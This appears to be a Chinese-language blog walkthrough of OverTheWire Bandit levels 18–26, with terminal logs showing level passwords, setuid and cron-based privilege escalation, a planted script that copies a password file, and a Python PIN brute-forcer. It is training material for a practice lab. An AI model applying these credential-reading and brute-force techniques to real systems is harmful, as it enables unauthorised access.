olOcepDiNss842eDAL411ARIMja2B3VibQxzNn8iqxCvtPBGq0BvsinoaBAuqwLJwtWCSe1wMdiSBSZRVO0eC5aK1WRlpKqPAglNSOPwc1OvUp8XCBD77G8bknfL90F44o0Nbe1jqCBvxqhqOZOpK7UHdGgsZeQirx8wr9omjopkzuPnQ1IO5OUcJ4P8ZSrLYNQLFnWS32AMUcEoUpDAclcfOrSI10qeUCHqxvSxR0aXyrNuzPVdEpMDIvTBj3eB4mgmhEeCg1WEFqLWThihtgEnlmNQ6SAqROgERjyxNfgJZk5l9sPHyleBjYNlZxQbHiCKNoeEfL7W3RAqfcmi6vHWL5CS7nqkHTcSdeRIoxDEGjUcI4zMnmzAP4Ei6FvZQ4vgvUhrhKYajGHMlKrQsbeU3cvq0GNIvwSMipBFUCHRLb4yqPoTs4J1oNw6KqREjqQk1fXNxAtQzNN6HgQNDvsu4VC7KBhIpQRCIRhLo4izRjGnPhoiXgdg3T385gjubCcKtnEa2kSQYiFBBWqlFI2IycHpCSESbmi8bgQ3XaRVkH9zC5qgaooKVu5QNTtqEXcgPpmX2IXZcd5BP8DJZaleBMYuyMzG96xJ6RDk6QUvLoiNsYnz4oTlDRKsDyWWVvseAeLnrVz80ul2MVRp5Pej7Ngv3QlcfY9MhFrpm1EER3UniQz99Dp18DDLdpkqxatJEorlEuxbffD0LZ5juRJ7Kpn9Y1d2tnXjZY5Qe5YsoSnDFkA6xfENw4qcgbyJOR1Lq4wHzoEzXf1DuyGtXuifUSHgURCvn8wW8ZVGkMFEwCGlsp7PdEBOlGtgQaiZA1BMdxpHPA0YPCtfZPxMUd4y9F8Ty8W36yMVQRVxJ7M1n4BrNnhvIf0O32W7YkNFetirVBSHpxx8PVaIAvk989y4J29tuDjZlSUAcQJ0GKlSLA76h32PPx4KHY0pxOVSViJDOzjaidS79i53bCdLIIpnsFeobeQnORAVeM7dwvlRhYcVlaVTJjuHSNlmnukU27pLKfjQDcpFm0RjVxCHhuF6NHsDa6UdNHgBdNIDH7SZzCEtY71skfE2Y1Tez1451HdcwjueU9wWO9SJUplInoYI9VmMuoTU64WX9fQgljz0SRrYCScjMB7OB5QL8ZiPgyd7wRqlsqhjjGu3fBUnc3gvyg7iyW1V4D0quYJPM3iNNy4mrbw5khrpkAXdNfkTs6Eqzj8Am07I4CKcrz9kBtBVlvTVZnvJ3AqfeFYuw89koZhuD036o50sDvVj9JU0ZMi76np4kE2SLw66QX3T8Ul4qgruVmX0Vx8h7H8GkTyAoZ1EbdKERioX8ShHYhFCIFVIyvP13kL75jAQyRSUG1osue0Rrc114FF98YH7HjJWPgJjMxInIjNK0ChvSQX10862VqCwIQsek952pqtLZiT8CzsalDfnn68FjdhbtgqEK1C80JH1LNM5JFed5XQBVYeiKU5qNNqDjLSbandit17@bandit:~$ diff passwords.old passwords.new 42c42&lt; hlbSBPAWJmL6WFDb06gpTx1pPButblOA---&gt; kfBf3eYk5BPBRzwjqutbbfE887SVc5Ydbandit17@bandit:~$ 这么长肯定不可能用肉眼去代替机器做的事嘛 所以就用到了diff命令 &lt;为第一个文件，&gt; 为第二个文件，因此flag为kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd level 19123456789101112131415161718192021222324252627282930bl@bl-virtual-machine:~/wargame$ ssh bandit18@bandit.labs.overthewire.org -p 2220This is a OverTheWire game server. More information on http://www.overthewire.org/wargamesbandit18@bandit.labs.overthewire.org's password: #kfBf3eYk5BPBRzwjqutbbfE887SVc5YdLinux bandit 4.18.12 x86_64 GNU/Linux ,----.. ,----, .---. / / \ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \ ; ; / /__./ \ : | . ; / ` ; .'___,/ ,' .--'. ' \' . ; | ; \ ; | | : | /___/ \ | ' ' | : | ; | ' ; |.'; ; ; \ \; : . | ' ' ' : `----' | | \ ; ` | ' ; \; / | ' : ; . \ .\ ; \ \ ', / | | ' \ \ ' \ | ; : / ' : | : ' |--" \ \ .' ; |.' \ \ ; www. `---` ver '---' he '---" ire.org Welcome to OverTheWire! Enjoy your stay!Byebye !Connection to bandit.labs.overthewire.org closed.bl@bl-virtual-machine:~/wargame$ 由上一关提示已经知道了，我们会看到byebye，直接看题目 .bashrc会禁止所有通过ssh登陆的 仅作了解，错误方向 https://blog.csdn.net/luoluonuoyasuolong/article/details/88806211 一种方法是利用命令拼接，将命令作为参数传过去，在执行shell之前运行 12345bl@bl-virtual-machine:~/wargame$ ssh bandit18@bandit.labs.overthewire.org -p 2220 'cat ./readme'This is a OverTheWire game server. More information on http://www.overthewire.org/wargamesbandit18@bandit.labs.overthewire.org's password: IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x 第二种方式利用scp命令绕过 12345678bl@bl-virtual-machine:~/wargame$ scp -P 2220 bandit18@bandit.labs.overthewire.org:./readme ./readmeThis is a OverTheWire game server. More information on http://www.overthewire.org/wargamesbandit18@bandit.labs.overthewire.org's password: readme 100% 33 0.0KB/s 00:00 bl@bl-virtual-machine:~/wargame$ cat ./readme IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5xbl@bl-virtual-machine:~/wargame$ 顺便爬下了他的.bashrc文件，这道题的万恶之源 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115# ~/.bashrc: executed by bash(1) for non-login shells.# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)# for examples# If not running interactively, don't do anythingcase $- in *i*) ;; *) return;;esac# don't put duplicate lines or lines starting with space in the history.# See bash(1) for more optionsHISTCONTROL=ignoreboth# append to the history file, don't overwrite itshopt -s histappend# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)HISTSIZE=1000HISTFILESIZE=2000# check the window size after each command and, if necessary,# update the values of LINES and COLUMNS.shopt -s checkwinsize# If set, the pattern "**" used in a pathname expansion context will# match all files and zero or more directories and subdirectories.#shopt -s globstar# make less more friendly for non-text input files, see lesspipe(1)#[ -x /usr/bin/lesspipe ] &amp;&amp; eval "$(SHELL=/bin/sh lesspipe)"# set variable identifying the chroot you work in (used in the prompt below)if [ -z "$&#123;debian_chroot:-&#125;" ] &amp;&amp; [ -r /etc/debian_chroot ]; then debian_chroot=$(cat /etc/debian_chroot)fi# set a fancy prompt (non-color, unless we know we "want" color)case "$TERM" in xterm-color|*-256color) color_prompt=yes;;esac# uncomment for a colored prompt, if the terminal has the capability; turned# off by default to not distract the user: the focus in a terminal window# should be on the output of commands, not on the prompt#force_color_prompt=yesif [ -n "$force_color_prompt" ]; then if [ -x /usr/bin/tput ] &amp;&amp; tput setaf 1 &gt;&amp;/dev/null; then4# We have color support; assume it's compliant with Ecma-484# (ISO/IEC-6429). (Lack of such support is extremely rare, and such4# a case would tend to support setf rather than setaf.)4color_prompt=yes else4color_prompt= fifiif [ "$color_prompt" = yes ]; then PS1='$&#123;debian_chroot:+($debian_chroot)&#125;\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ 'else PS1='$&#123;debian_chroot:+($debian_chroot)&#125;\u@\h:\w\$ 'fiunset color_prompt force_color_prompt# If this is an xterm set the title to user@host:dircase "$TERM" inxterm*|rxvt*) PS1="\[\e]0;$&#123;debian_chroot:+($debian_chroot)&#125;\u@\h: \w\a\]$PS1" ;;*) ;;esac# enable color support of ls and also add handy aliasesif [ -x /usr/bin/dircolors ]; then test -r ~/.dircolors &amp;&amp; eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)" alias ls='ls --color=auto' #alias dir='dir --color=auto' #alias vdir='vdir --color=auto' #alias grep='grep --color=auto' #alias fgrep='fgrep --color=auto' #alias egrep='egrep --color=auto'fi# colored GCC warnings and errors#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'# some more ls aliases#alias ll='ls -l'#alias la='ls -A'#alias l='ls -CF'# Alias definitions.# You may want to put all your additions into a separate file like# ~/.bash_aliases, instead of adding them here directly.# See /usr/share/doc/bash-doc/examples in the bash-doc package.if [ -f ~/.bash_aliases ]; then . ~/.bash_aliasesfi# enable programmable completion features (you don't need to enable# this, if it's already enabled in /etc/bash.bashrc and /etc/profile# sources /etc/bash.bashrc).if ! shopt -oq posix; then if [ -f /usr/share/bash-completion/bash_completion ]; then . /usr/share/bash-completion/bash_completion elif [ -f /etc/bash_completion ]; then . /etc/bash_completion fifiecho 'Byebye !'exit 0 level 20 关于setuid：https://blog.csdn.net/oo__yan/article/details/7076889 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103bandit19@bandit:~$ lsbandit20-dobandit19@bandit:~$ ./bandit20-do Run a command as another user. Example: ./bandit20-do idbandit19@bandit:~$ strings bandit20-do /lib/ld-linux.so.2libc.so.6_IO_stdin_usedexitexecvprintf__libc_start_main__gmon_start__GLIBC_2.0PTRh0QVhkUWVSt$,U[^_]Run a command as another user. Example: %s id/usr/bin/env;*2$"GCC: (Debian 6.3.0-18+deb9u1) 6.3.0 20170516crtstuff.c__JCR_LIST__deregister_tm_clones__do_global_dtors_auxcompleted.6587__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entrybandit20.c__FRAME_END____JCR_END____init_array_end_DYNAMIC__init_array_start__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_csu_fini__x86.get_pc_thunk.bxprintf@@GLIBC_2.0_edata__data_start__gmon_start__exit@@GLIBC_2.0__dso_handle_IO_stdin_used__libc_start_main@@GLIBC_2.0execv@@GLIBC_2.0__libc_csu_init_fp_hw__bss_startmain__TMC_END__.symtab.strtab.shstrtab.interp.note.ABI-tag.note.gnu.build-id.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rel.dyn.rel.plt.init.plt.got.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.jcr.dynamic.got.plt.data.bss.commentbandit19@bandit:~$ ./bandit20-do Run a command as another user. Example: ./bandit20-do idbandit19@bandit:~$ ./bandit20-do iduid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19)bandit19@bandit:~$ ls -altotal 28drwxr-xr-x 2 root root 4096 Oct 16 2018 .drwxr-xr-x 41 root root 4096 Oct 16 2018 ..-rwsr-x--- 1 bandit20 bandit19 7296 Oct 16 2018 bandit20-do-rw-r--r-- 1 root root 220 May 15 2017 .bash_logout-rw-r--r-- 1 root root 3526 May 15 2017 .bashrc-rw-r--r-- 1 root root 675 May 15 2017 .profilebandit19@bandit:~$ ./bandit20-do whoamibandit20bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20GbKksEFF4yrVs6il55v6gwY5aVje5f0jbandit19@bandit:~$ 这一关涉及到的是linux权限的相关知识。/etc/bandit_pass/bandit20的所有者为bandit20，而其权限设置使得只有自身和bandit20这个group的成员能够读取。 setuid这个文件的拥有者为bandit20，而bandit19，也就是当前登录用户有执行的权限。而该文件有s权限，即setuid权限。能够在程序中调用setuid()系统调用，将自身的suid改成与euid相同，也就是在运行中作为bandit20执行命令。 对于手头的这个文件，只要将欲执行的命令作为参数传入即可。 这样的文件如果能够通过一定方式执行命令甚至于获得shell，是渗透人员理想的提权途径。 level 21题目的意思是有一个setuid的执行文件，他会和localhost的给定端口建立连接，然后他会从连接中读取一行信息，将其和前一关的flag对比，正确就会返回flag 1234567891011121314bandit20@bandit:~$ ls -altotal 32drwxr-xr-x 2 root root 4096 Oct 16 2018 .drwxr-xr-x 41 root root 4096 Oct 16 2018 ..-rw-r--r-- 1 root root 220 May 15 2017 .bash_logout-rw-r--r-- 1 root root 3526 May 15 2017 .bashrc-rw-r--r-- 1 root root 675 May 15 2017 .profile-rwsr-x--- 1 bandit21 bandit20 12088 Oct 16 2018 suconnectbandit20@bandit:~$ ./suconnect Usage: ./suconnect &lt;portnumber&gt;This program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back.bandit20@bandit:~$ nc -lp 2333 &lt; /etc/bandit_pass/bandit20gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGrbandit20@bandit:~$ 利用nc监听端口即可做到 1234567bandit20@bandit:~$ bandit20@bandit:~$ lssuconnectbandit20@bandit:~$ ./suconnect 2333Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0jPassword matches, sending next passwordbandit20@bandit:~$ level 22这关原以为是让了解crontab的用法，没想到看执行文件干了什么就得到了flag 12345678910111213141516171819202122bandit21@bandit:~$ cat /etc/bandit_pass/bandit21gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGrbandit21@bandit:~$ ls /etc/cron.d/atop cronjob_bandit22 cronjob_bandit23 cronjob_bandit24bandit21@bandit:~$ cat /etc/cron.d/atopPATH=/bin:/usr/bin:/sbin:/usr/sbin# daily restart of atop at midnight0 0 * * * root if [ -d "/run/systemd/system" ]; then systemctl restart atop; else /usr/share/atop/atop.daily \&amp; ; fibandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22@reboot bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/nullbandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh #!/bin/bashchmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvcat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvbandit21@bandit:~$ cat /usr/bin/cronjob_bandit23.sh cat: /usr/bin/cronjob_bandit23.sh: Permission deniedbandit21@bandit:~$ crontab -lcrontabs/bandit21/: fopen: Permission deniedbandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvYk7owGAcWjwMVRwrTesJEwB7WVOiILLI level 23 https://www.linuxidc.com/Linux/2019-03/157335.htm 其他的： https://blog.csdn.net/long2746004900/article/details/53367353 https://blog.csdn.net/zhongqi2513/article/details/78613768 这关的核心还是阅读shell文件 题目也十分温馨的提醒了，若是不懂可以运行运行debug 123456789101112131415161718192021222324252627282930313233bandit22@bandit:~$ ls /etc/cron.datop cronjob_bandit22 cronjob_bandit23 cronjob_bandit24bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23@reboot bandit23 /usr/bin/cronjob_bandit23.sh &amp;&gt; /dev/null* * * * * bandit23 /usr/bin/cronjob_bandit23.sh &amp;&gt; /dev/nullbandit22@bandit:~$ cat /usr/bin/croncronjob_bandit22.sh cronjob_bandit24.sh cronjob_bandit23.sh crontab bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh#!/bin/bashmyname=$(whoami)mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"cat /etc/bandit_pass/$myname &gt; /tmp/$mytargetbandit22@bandit:~$ echo I am user $myname | md5sum | cut -d ' ' -f 17db97df393f40ad1691b6e1fb03d53ebbandit22@bandit:~$ cat /tmp/7db97df393f40ad1691b6e1fb03d53ebYk7owGAcWjwMVRwrTesJEwB7WVOiILLIbandit22@bandit:~$ whoamibandit22bandit22@bandit:~$ /usr/bin/cronjob_bandit23.sh &amp;&gt; /dev/nullbandit22@bandit:~$ /usr/bin/cronjob_bandit23.sh Copying passwordfile /etc/bandit_pass/bandit22 to /tmp/8169b67bd894ddbb4412f91573b38db3bandit22@bandit:~$ ls -al /usr/bin/cronjob_bandit23.sh-rwxr-x--- 1 bandit23 bandit22 211 Oct 16 2018 /usr/bin/cronjob_bandit23.shbandit22@bandit:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 18ca319486bfbbc3663ea0fbe81326349bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349jc1udXuA1tiHqjIsL8yaapX5XIAI6i0nbandit22@bandit:~$ 但是这里有个坑，忽然发现得到的flag和上次一样，注意到该sh是bandit23所执行的，属于bandit22组，所以用户名应该是bandit23 最后查询的flag进入下一关 level 24老套路，打开sh阅读源码 这是一个能运行并删除某个文件夹里所有脚本文件的脚本（这里用到timeout去执行任何文件 所以我们需要自己写一个脚本去获取密码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24 @reboot bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/null* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/nullbandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh#!/bin/bashmyname=$(whoami)cd /var/spool/$mynameecho "Executing and deleting all scripts in /var/spool/$myname:"for i in * .*;do if [ "$i" != "." -a "$i" != ".." ]; then4echo "Handling $i"4timeout -s 9 60 ./$i4rm -f ./$i fidonebandit23@bandit:~$ ls -al /usr/bin/cronjob_bandit24.sh-rwxr-x--- 1 bandit24 bandit23 253 Oct 16 2018 /usr/bin/cronjob_bandit24.shbandit23@bandit:~$ ls /var/spool/bandit24ls: cannot open directory '/var/spool/bandit24': Permission deniedbandit23@bandit:~$ ls /var/spool/bandit24 cron mail rsyslogbandit23@bandit:~$ ls /var/spool/ -altotal 1348drwxr-xr-x 5 root root 4096 Oct 16 2018 .drwxr-xr-x 11 root root 4096 Oct 16 2018 ..drwxrwx-wx 37 root bandit24 1359872 Feb 16 10:41 bandit24drwxr-xr-x 3 root root 4096 Oct 16 2018 cronlrwxrwxrwx 1 root root 7 Oct 16 2018 mail -&gt; ../maildrwx------ 2 root root 4096 Jan 14 2018 rsyslogbandit23@bandit:~$ lsbandit23@bandit:~$ touch fuck.shtouch: cannot touch 'fuck.sh': Permission deniedbandit23@bandit:~$ touch /tmp/bandit23/fuck.shbandit23@bandit:~$ ls -al /tmp/bandit23/total 305956drwxrwxrwx 7 bandit23 root 4096 Feb 16 10:56 .drwxrws-wt 1 root root 313204736 Feb 16 10:57 ..-rw-r--r-- 1 bandit23 bandit23 0 Feb 16 10:56 fuck.sh-rw-r--r-- 1 bandit24 bandit24 1 Feb 14 16:05 out-rw-r--r-- 1 bandit24 bandit24 0 Feb 14 16:49 output-rw-r--r-- 1 bandit24 bandit24 66 Feb 14 20:48 passdrwxr-xr-x 3 bandit27 bandit27 4096 Feb 7 13:12 repodrwxr-xr-x 3 bandit28 bandit28 4096 Feb 7 13:21 repo28drwxr-xr-x 4 bandit29 bandit29 4096 Feb 7 13:28 repo29drwxr-xr-x 3 bandit30 bandit30 4096 Feb 7 13:29 repo30drwxr-xr-x 3 bandit31 bandit31 4096 Feb 7 13:55 repo31-rwxrwxrwx 1 bandit23 bandit23 99 Feb 15 17:49 shell.shbandit23@bandit:~$ vim /tmp/bandit23/fuck.shbandit23@bandit:/tmp/bandit23$ cat fuck.sh#!/bin/bashcat /etc/bandit_pass/bandit24 &gt;&gt; /tmp/bandit23/bandit23_passbandit23@bandit:~$ chmod +x /tmp/bandit23/fuck.shbandit23@bandit:~$ bandit23@bandit:~$ cd /tmp/bandit23bandit23@bandit:/tmp/bandit23$ lsfuck.sh out output pass repo repo28 repo29 repo30 repo31 shell.shbandit23@bandit:/tmp/bandit23$ cp fuck.sh /var/spool/bandit24/fuck.shbandit23@bandit:/tmp/bandit23$ lsfuck.sh out output pass repo repo28 repo29 repo30 repo31 shell.shbandit23@bandit:/tmp/bandit23$ lsfuck.sh out output pass repo repo28 repo29 repo30 repo31 shell.shbandit23@bandit:/tmp/bandit23$ lsfuck.sh out output pass repo repo28 repo29 repo30 repo31 shell.shbandit23@bandit:/tmp/bandit23$ lsbandit23_pass out pass repo28 repo30 shell.shfuck.sh output repo repo29 repo31bandit23@bandit:/tmp/bandit23$ cat bandit23_passUoMYTrfrBFHyQXmg6gzctqAwOmw1IohZbandit23@bandit:/tmp/bandit23$ level 2512345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364bandit24@bandit:~$ telnet localhost 30002Trying 127.0.0.1...Connected to localhost.Escape character is '^]'.I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1Timeout. Exiting.Connection closed by foreign host.bandit24@bandit:/tmp/bandit24$ nc localhost 30002I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 5201Wrong! Please enter the correct pincode. Try again.UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1213Wrong! Please enter the correct pincode. Try again.^Cbandit24@bandit:~$ cd /tmp/bandit24bandit24@bandit:/tmp/bandit24$ lsbandit24.sh counters.txt pass pin_mod.py pktempdir tcolbandit25.sh getpass.sh pass24.sh pin.py qsd.txt test.txtbash_file.sh mine.sh password.txt pins script.sh wesh.shbandit24@bandit:/tmp/bandit24$ UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ-bash: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ: command not foundbandit24@bandit:/tmp/bandit24$ nc localhost 30002 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZI am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space. Fail! You did not supply enough data. Try again.UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1^Cbandit24@bandit:/tmp/bandit24$ lsbandit24.sh fuck24.sh pass24.sh pins tcolbandit25.sh getpass.sh password.txt pktempdir test.txtbash_file.sh mine.sh pin_mod.py qsd.txt wesh.shcounters.txt pass pin.py script.shbandit24@bandit:/tmp/bandit24$ pythonPython 2.7.13 (default, Sep 26 2018, 18:42:22) [GCC 6.3.0 20170516] on linux2Type "help", "copyright", "credits" or "license" for more information.&gt;&gt;&gt; exit()bandit24@bandit:/tmp/bandit24$ touch fuck24.pybandit24@bandit:/tmp/bandit24$ vim fuck24.pybandit24@bandit:/tmp/bandit24$ touch pass24bandit24@bandit:/tmp/bandit24$ cat fuck24.py# !/usr/bin/env pythonf = open('pass24','w')passwd = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'for i in range(10000): flag = passwd + ' ' + str(i).zfill(4) + '\n' f.write(flag)f.close()bandit24@bandit:/tmp/bandit24$ python fuck24.pybandit24@bandit:/tmp/bandit24$ less pass24bandit24@bandit:/tmp/bandit24$ nc localhost 30002 &lt; pass24 &gt; ans.txtbandit24@bandit:/tmp/bandit24$ sort ans.txt | uniq -uCorrect!Exiting.I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzGbandit24@bandit:/tmp/bandit24$ 简单来说，有一个程序在监听30002端口，接收$bandit24_pass pin，需要我们爆破pin 这边利用python生成pass24字典 123456789# !/usr/bin/env pythonf = open('pass24','w')passwd = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'for i in range(10000): flag = passwd + ' ' + str(i).zfill(4) + '\n' f.write(flag)f.close() 然后通过nc localhost 30002 &lt; pass24 &gt; ans.txt命令将其传给守护程序，返回结果存入ans.txt 然后再ans.txt中找出不一样的即可 //TODO：后续想用单纯的shell脚本跑一波 level26123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166bandit25@bandit:~$ lsbandit26.sshkeybandit25@bandit:~$ ssh bandit26@localhost -i bandit26.sshkey Could not create directory '/home/bandit25/.ssh'.The authenticity of host 'localhost (127.0.0.1)' can't be established.ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.Are you sure you want to continue connecting (yes/no)? yesFailed to add the host to the list of known hosts (/home/bandit25/.ssh/known_hosts).This is a OverTheWire game server. More information on http://www.overthewire.org/wargamesLinux bandit 4.18.12 x86_64 GNU/Linux ,----.. ,----, .---. / / \ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \ ; ; / /__./ \ : | . ; / ` ; .'___,/ ,' .--'. ' \' . ; | ; \ ; | | : | /___/ \ | ' ' | : | ; | ' ; |.'; ; ; \ \; : . | ' ' ' : `----' | | \ ; ` | ' ; \; / | ' : ; . \ .\ ; \ \ ', / | | ' \ \ ' \ | ; : / ' : | : ' |--" \ \ .' ; |.' \ \ ; www. `---` ver '---' he '---" ire.org Welcome to OverTheWire!If you find any problems, please report them to Steven or morla onirc.overthewire.org.--[ Playing the games ]-- This machine might hold several wargames. If you are playing "somegame", then: * USERNAMES are somegame0, somegame1, ... * Most LEVELS are stored in /somegame/. * PASSWORDS for each level are stored in /etc/somegame_pass/. Write-access to homedirectories is disabled. It is advised to create a working directory with a hard-to-guess name in /tmp/. You can use the command "mktemp -d" in order to generate a random and hard to guess directory in /tmp/. Read-access to both /tmp/ and /proc/ is disabled so that users can not snoop on eachother. Files and directories with easily guessable or short names will be periodically deleted!4 Please play nice: * don't leave orphan processes running * don't leave exploit-files laying around * don't annoy other players * don't post passwords or spoilers * again, DONT POST SPOILERS! This includes writeups of your solution on your blog or website!--[ Tips ]-- This machine has a 64bit processor and many security-features enabled by default, although ASLR has been switched off. The following compiler flags might be interesting: -m32 compile for 32bit -fno-stack-protector disable ProPolice -Wl,-z,norelro disable relro In addition, the execstack tool can be used to flag the stack as executable on ELF binaries. Finally, network-access is limited for most levels by a local firewall.--[ Tools ]-- For your convenience we have installed a few usefull tools which you can find in the following locations: * pwndbg (https://github.com/pwndbg/pwndbg) in /usr/local/pwndbg/ * peda (https://github.com/longld/peda.git) in /usr/local/peda/ * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/ * pwntools (https://github.com/Gallopsled/pwntools) * radare2 (http://www.radare.org/) * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh--[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us through IRC on irc.overthewire.org #wargames. Enjoy your stay! _ _ _ _ ___ __ | | | (_) | |__ \ / / | |__ __ _ _ __ __| |_| |_ ) / /_ | '_ \ / _` | '_ \ / _` | | __| / / '_ \ | |_) | (_| | | | | (_| | | |_ / /| (_) | |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/ Connection to localhost closed.bandit25@bandit:~$ bandit25@bandit:~$ cat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/bin/falsemessagebus:x:101:104::/var/run/dbus:/bin/falsesshd:x:102:65534::/run/sshd:/usr/sbin/nologinidentd:x:103:65534::/var/run/identd:/bin/falsentp:x:104:107::/home/ntp:/bin/falsebandit0:x:11000:11000:bandit level 0:/home/bandit0:/bin/bashbandit1:x:11001:11001:bandit level 1:/home/bandit1:/bin/bashbandit10:x:11010:11010:bandit level 10:/home/bandit10:/bin/bashbandit11:x:11011:11011:bandit level 11:/home/bandit11:/bin/bashbandit12:x:11012:11012:bandit level 12:/home/bandit12:/bin/bashbandit13:x:11013:11013:bandit level 13:/home/bandit13:/bin/bashbandit14:x:11014:11014:bandit level 14:/home/bandit14:/bin/bashbandit15:x:11015:11015:bandit level 15:/home/bandit15:/bin/bashbandit16:x:11016:11016:bandit level 16:/home/bandit16:/bin/bashbandit17:x:11017:11017:bandit level 17:/home/bandit17:/bin/bashbandit18:x:11018:11018:bandit level 18:/home/bandit18:/bin/bashbandit19:x:11019:11019:bandit level 19:/home/bandit19:/bin/bashbandit2:x:11002:11002:bandit level 2:/home/bandit2:/bin/bashbandit20:x:11020:11020:bandit level 20:/home/bandit20:/bin/bashbandit21:x:11021:11021:bandit level 21:/home/bandit21:/bin/bashbandit22:x:11022:11022:bandit level 22:/home/bandit22:/bin/bashbandit23:x:11023:11023:bandit level 23:/home/bandit23:/bin/bashbandit24:x:11024:11024:bandit level 24:/home/bandit24:/bin/bashbandit25:x:11025:11025:bandit level 25:/home/bandit25:/bin/bashbandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtextbandit27:x:11027:11027:bandit level 27:/home/bandit27:/bin/bashbandit28:x:11028:11028:bandit level 28:/home/bandit28:/bin/bashbandit29:x:11029:11029:bandit level 29:/home/bandit29:/bin/bashbandit3:x:11003:11003:bandit level 3:/home/bandit3:/bin/bashbandit30:x:11030:11030:bandit level 30:/home/bandit30:/bin/bashbandit31:x:11031:11031:bandit level 31:/home/bandit31:/bin/bashbandit32:x:11032:11032:bandit level 32:/home/bandit32:/home/bandit32/uppershellbandit33:x:11033:11033:bandit level 